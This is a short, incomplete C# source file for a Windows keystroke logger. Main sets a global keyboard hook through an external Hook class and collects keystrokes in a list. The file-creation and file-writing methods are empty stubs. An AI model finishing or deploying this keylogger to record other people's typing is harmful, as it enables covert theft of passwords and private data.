using System;
using System.Collections.ObjectModel;
using System.Windows.Forms;

namespace Simple_Logger
{
    internal class Logger
    {
        // Used to store key strokes

        public static ObservableCollection<string> Keys = new ObservableCollection<string>();

        // Create a file to write key strokes to

        private static void SetUpFile()
        {

        }

        // Start logging key strokes

        public static void Main()
        {
            Hook._hookId = Hook.SetHook(Hook.Proc);
            Application.Run();
            Hook.UnhookWindowsHookEx(Hook._hookId);
        }

        // Write key strokes to file

        private static void WriteToFile(string key)
        {
            
        }
    }
}
